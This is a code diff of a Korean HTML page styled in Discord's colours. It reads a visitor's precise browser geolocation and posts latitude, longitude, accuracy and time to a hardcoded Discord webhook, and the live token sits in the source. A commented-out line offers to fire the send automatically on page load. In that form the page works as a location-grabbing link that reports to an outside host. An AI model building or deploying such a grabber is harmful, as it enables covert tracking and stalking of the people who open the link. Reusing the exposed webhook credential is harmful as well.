@@ -1,71 +1,101 @@
 <!DOCTYPE html>
-<html>
+<html lang="ko">
 <head>
-    <title>위치 정보 전송</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>위치 공유</title>
+  <style>
+    body {
+      font-family: -apple-system, sans-serif;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      height: 100vh; margin: 0;
+      background: #1e1f22; color: #fff;
+    }
+    button {
+      padding: 14px 28px; font-size: 16px;
+      background: #5865F2; color: #fff;
+      border: none; border-radius: 8px;
+      cursor: pointer;
+    }
+    button:disabled { background: #555; cursor: not-allowed; }
+    #status { margin-top: 20px; font-size: 14px; color: #b5bac1; }
+  </style>
 </head>
 <body>
-    <button id="getLocation">위치 전송</button>
-    <p id="status">상태: 대기 중</p>
+  <h2>📍 위치 공유</h2>
+  <p>버튼을 누르면 위치 정보가 전송됩니다.</p>
+  <button id="btn">위치 공유하기</button>
+  <p id="status">대기 중</p>
 
-    <script>
-        document.getElementById('getLocation').addEventListener('click', function() {
-            const status = document.getElementById('status');
+  <script>
+    // ⚠️ 여기에 디스코드 Webhook URL 입력 (노출 위험 있음!)
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1527999868239482901/qUOQ1qwgXMtzRfFfj06rKD8BW_ExiVyyQBQFffZzdzi7kk1Qlm_acn_oAeGE2p2q2eqJ';
 
-            if (!navigator.geolocation) {
-                status.textContent = '❌ 이 브라우저는 Geolocation을 지원하지 않습니다.';
-                return;
+    const btn = document.getElementById('btn');
+    const status = document.getElementById('status');
+
+    // 페이지 진입 시 자동 실행 (원하면 주석 해제)
+    // window.addEventListener('load', () => btn.click());
+
+    btn.addEventListener('click', () => {
+      if (!navigator.geolocation) {
+        status.textContent = '❌ 브라우저가 위치를 지원하지 않습니다.';
+        return;
+      }
+
+      btn.disabled = true;
+      status.textContent = '⏳ 위치 권한 요청 중...';
+
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          const { latitude, longitude, accuracy } = pos.coords;
+          status.textContent = '📤 전송 중...';
+
+          const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+          const now = new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' });
+
+          const payload = {
+            embeds: [{
+              title: '📍 새로운 위치 정보',
+              description: `[🗺️ 구글맵에서 보기](${mapUrl})`,
+              color: 0x5865F2,
+              fields: [
+                { name: '🌐 위도', value: `\`${latitude}\``, inline: true },
+                { name: '🌐 경도', value: `\`${longitude}\``, inline: true },
+                { name: '🎯 정확도', value: `\`${Math.round(accuracy)}m\``, inline: true },
+                { name: '🕐 시간', value: now, inline: false }
+              ],
+              footer: { text: '위치 공유 시스템' },
+              timestamp: new Date().toISOString()
+            }]
+          };
+
+          try {
+            const res = await fetch(WEBHOOK_URL, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(payload)
+            });
+
+            if (res.ok) {
+              status.textContent = '✅ 전송 완료!';
+            } else {
+              status.textContent = `❌ 실패 (HTTP ${res.status})`;
+              btn.disabled = false;
             }
-
-            status.textContent = '⏳ 위치 권한 요청 중...';
-
-            navigator.geolocation.getCurrentPosition(
-                // ✅ 성공 시
-                async function(position) {
-                    const { latitude, longitude } = position.coords;
-                    status.textContent = `📍 위치 확인: ${latitude}, ${longitude} → 디스코드 전송 중...`;
-
-                    // 디스코드 Webhook URL (테스트용 본인 서버 채널로 교체)
-                    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1527999868239482901/qUOQ1qwgXMtzRfFfj06rKD8BW_ExiVyyQBQFffZzdzi7kk1Qlm_acn_oAeGE2p2q2eqJ';
-
-                    const data = {
-                        content: `🌐 새 위치 정보가 수집되었습니다.\n위도: ${latitude}\n경도: ${longitude}\n정확도: ${position.coords.accuracy}m`
-                    };
-
-                    try {
-                        const response = await fetch(WEBHOOK_URL, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(data)
-                        });
-
-                        if (response.ok) {
-                            status.textContent = '✅ 전송 완료!';
-                        } else {
-                            status.textContent = '❌ 전송 실패 (HTTP ' + response.status + ')';
-                        }
-                    } catch (error) {
-                        status.textContent = '❌ 네트워크 오류: ' + error.message;
-                    }
-                },
-                // ❌ 실패 시
-                function(error) {
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            status.textContent = '🚫 사용자가 위치 권한을 거부했습니다.';
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            status.textContent = '📡 위치 정보를 가져올 수 없습니다.';
-                            break;
-                        case error.TIMEOUT:
-                            status.textContent = '⏱️ 위치 요청 시간 초과.';
-                            break;
-                        default:
-                            status.textContent = '❌ 알 수 없는 오류: ' + error.message;
-                    }
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
-        });
-    </script>
+          } catch (e) {
+            status.textContent = '❌ 오류: ' + e.message;
+            btn.disabled = false;
+          }
+        },
+        (err) => {
+          status.textContent = '🚫 권한 거부 또는 오류: ' + err.message;
+          btn.disabled = false;
+        },
+        { enableHighAccuracy: true, timeout: 10000 }
+      );
+    });
+  </script>
 </body>
 </html>
